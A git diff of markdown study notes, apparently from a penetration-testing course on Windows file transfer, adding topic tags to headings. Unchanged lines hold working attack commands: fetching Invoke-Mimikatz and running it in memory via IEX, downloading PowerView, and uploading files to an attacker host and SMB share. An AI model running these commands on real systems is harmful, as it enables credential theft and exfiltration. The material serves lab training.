@@ -1,4 +1,4 @@
-
+#PowerShell
 ___
 
 ## Introduction
@@ -33,7 +33,7 @@ Depending on the file size we want to transfer, we can use different methods tha
 
 An essential step in using this method is to ensure the file you encode and decode is correct. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.
 
-#### Pwnbox Check SSH Key MD5 Hash
+#### Pwnbox Check SSH Key MD5 Hash #md5
 
 Windows File Transfer Methods
 
@@ -43,7 +43,7 @@ Windows File Transfer Methods
 4e301756a07ded0a2dd6953abf015278  id_rsa
 ```
 
-#### Pwnbox Encode SSH Key to Base64
+#### Pwnbox Encode SSH Key to Base64 #base64 
 
 Windows File Transfer Methods
 
@@ -113,7 +113,7 @@ PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File
 PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
 ```
 
-#### PowerShell DownloadString - Fileless Method
+#### PowerShell DownloadString - Fileless Method #IEX
 
 As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
 
@@ -132,7 +132,7 @@ Windows File Transfer Methods
 PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
 
-#### PowerShell Invoke-WebRequest
+#### PowerShell Invoke-WebRequest #iwr #wget #curl 
 
 From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
 
@@ -186,7 +186,7 @@ PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback
 
 ___
 
-## SMB Downloads
+## SMB Downloads #SMB 
 
 The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.
 
@@ -267,7 +267,7 @@ C:\htb> copy n:\nc.exe
 
 ___
 
-## FTP Downloads
+## FTP Downloads #FTP 
 
 Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.
 
@@ -377,7 +377,7 @@ Windows File Transfer Methods
 
 ___
 
-## PowerShell Web Uploads
+## PowerShell Web Uploads #PowerShell 
 
 PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.
 
@@ -419,7 +419,7 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
 ```
 
-### PowerShell Base64 Web Upload
+### PowerShell Base64 Web Upload #netcat 
 
 Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
 
@@ -458,7 +458,7 @@ Windows File Transfer Methods
 
 ___
 
-## SMB Uploads
+## SMB Uploads #SMB #WebDav
 
 We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).
 
@@ -549,7 +549,7 @@ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 
 ___
 
-## FTP Uploads
+## FTP Uploads #FTP 
 
 Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.
 
